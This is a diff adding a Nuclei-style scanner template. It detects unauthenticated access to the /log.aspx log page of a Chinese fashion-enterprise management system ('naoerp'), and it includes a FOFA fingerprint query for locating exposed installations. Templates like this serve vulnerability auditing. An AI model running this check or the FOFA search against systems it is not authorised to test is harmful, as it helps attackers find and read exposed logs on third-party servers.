@@ -1,0 +1,31 @@
+id: naoerp-log-disclosure
+info:
+  name: 西安九佳易信息资讯有限公司时尚企业管理系统日志页面未授权访问
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60452/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/XiTong/Index/W_IndexPbForm.win.js"
+    tips:
+    repair:
+    version:
+  tags: naoerp,disclosure
+
+http:
+  - raw:
+      - |
+        GET /log.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'加密狗','Redis')
+        condition: and
